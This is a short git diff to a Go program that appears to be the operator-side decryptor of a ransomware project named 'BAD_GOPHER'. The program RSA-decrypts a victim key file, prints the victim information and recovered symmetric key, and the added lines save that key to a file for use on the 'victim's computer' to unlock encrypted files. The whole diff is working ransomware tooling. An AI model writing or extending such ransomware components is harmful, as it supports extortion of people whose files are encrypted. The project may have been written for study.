@@ -10,6 +10,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"strings"
 )
 
 func main() {
@@ -27,10 +28,16 @@ func main() {
 	keyFileBytes, _ := hex.DecodeString(string(keyFileText))
 	plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, keyFileBytes, nil)
 
-	information := plaintext[:len(plaintext)-32]
+	information := string(plaintext[:len(plaintext)-32])
 	symmetricKey := plaintext[len(plaintext)-32:]
 	fmt.Printf("Information:\n%s\n", information)
-	fmt.Printf("Symmetric Key: %x", symmetricKey)
+	fmt.Printf("Symmetric Key: %x\n", symmetricKey)
 
 	// TODO: Save symmetric key to a file that can be loaded on victim's computer to decrypt files
+	symmetricKeyEncoded := hex.EncodeToString(symmetricKey)
+	filename := fmt.Sprintf("BAD_GOPHER_DECRYPT_%s", strings.ReplaceAll(strings.Split(information, "\n")[1], " ", "_")[:10])
+	fmt.Println(filename)
+	f, _ := os.Create(filename)
+	defer f.Close()
+	f.WriteString(symmetricKeyEncoded)
 }
